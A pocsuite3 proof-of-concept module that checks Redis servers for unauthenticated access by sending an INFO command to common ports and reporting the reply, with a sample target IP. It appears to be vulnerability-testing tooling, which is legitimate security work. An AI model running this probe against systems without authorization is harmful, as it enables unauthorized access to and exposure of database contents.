#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
from urllib.parse import urlparse
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = '00002'
    version = '1'
    author = 'jeffzhang'
    vulDate = '2017-08-15'
    createDate = '2017-08-15'
    updateDate = '2017-08-15'
    references = [
        'http://blog.knownsec.com/2015/11/\
        analysis-of-redis-unauthorized-of-expolit/']
    name = 'Redis 未授权访问'
    appPowerLink = 'https://www.redis.io'
    appName = 'Redis'
    appVersion = 'All'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
            redis 默认没有开启相关认证，黑客直接访问即可获取数据库中所有信息。
    '''
    samples = ['128.36.23.111']

    def _verify(self):
        result = {}
        payload = b'\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        pr = urlparse(self.url)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [6379, 16379, 26379]
        for port in ports:
            try:
                s = socket.socket()
                s.connect((pr.hostname, port))
                s.send(payload)
                data = s.recv(4096)
                if data and b'redis_version' in data:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = '{}:{}'.format(
                        pr.hostname, port)
                    result['extra'] = {}
                    result['extra']['evidence'] = data.decode('utf-8')
                    break
            except:
                #raise
                pass
            finally:
                s.close()

        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("not vulnerability")
        return output


register_poc(TestPOC)
